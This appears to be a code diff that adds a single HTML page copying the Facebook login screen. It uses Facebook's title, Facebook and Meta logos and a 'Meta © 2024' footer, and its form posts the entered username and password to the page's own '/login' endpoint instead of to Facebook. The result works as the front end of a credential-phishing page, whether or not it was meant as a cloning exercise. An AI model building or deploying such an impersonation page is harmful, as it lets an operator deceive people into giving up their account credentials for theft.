@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(to bottom, #ffffff, #f0f2f5);
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 50px;
+            height: 50px;
+        }
+        .login-container {
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 30px;
+            width: 100%;
+            max-width: 350px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .login-container input {
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+        .btn-login {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            width: 100%;
+            font-size: 16px;
+        }
+        .btn-login:hover {
+            background-color: #145dbf;
+        }
+        .forgot-password {
+            display: block;
+            text-align: center;
+            color: #1877f2;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            margin: 20px 0;
+            text-align: center;
+            font-size: 14px;
+            color: #606770;
+        }
+        .create-account {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .create-account button {
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            width: 100%;
+            font-size: 16px;
+        }
+        .meta {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 14px;
+            color: #606770;
+        }
+        .meta-logo img {
+            width: 80px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <div class="login-container">
+            <form method="POST" action="/login">
+                <input type="text" class="form-control" name="username" placeholder="Mobile number or email address" required>
+                <input type="password" class="form-control" name="password" placeholder="Password" required>
+                <button type="submit" class="btn-login">Log In</button>
+            </form>
+            <a href="#" class="forgot-password">Forgotten Password?</a>
+            <div class="divider">or</div>
+            <div class="create-account">
+                <button>Create New Account</button>
+            </div>
+        </div>
+        <div class="meta">
+            <div class="meta-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta Logo">
+            </div>
+            <p>Meta © 2024</p>
+            <a href="#">About</a> • 
+            <a href="#">Help</a> • 
+            <a href="#">More</a>
+        </div>
+    </div>
+</body>
+</html>
